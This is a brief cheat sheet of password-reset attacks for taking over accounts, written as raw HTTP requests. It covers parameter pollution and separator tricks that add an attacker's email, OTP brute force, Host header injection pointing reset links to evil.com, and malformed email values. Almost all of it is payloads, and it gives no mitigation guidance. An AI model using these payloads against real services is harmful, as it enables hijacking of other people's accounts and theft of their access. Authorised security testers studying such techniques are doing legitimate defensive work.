## Account Takeover

1. Parameter pollution in reset password
```
POST /reset
[...]
email=victim@mail.com&email=hacker@mail.com
```

2. Bruteforce the OTP code
```
POST /reset
[...]
email=victim@mail.com&code=$123456$
```

3. Host header Injection
```
POST /reset
Host: evil.com
[...]
email=victim@mail.com
```
And the victim will receive the reset link with evil.com

4. Using separator in value of the parameter
```
POST /reset
[...]
email=victim@mail.com,hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com%20hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com|hacker@mail.com
```

5. No domain in value of the paramter
```
POST /reset
[...]
email=victim
```

6. No TLD in value of the paramter
```
POST /reset
[...]
email=victim@mail
```
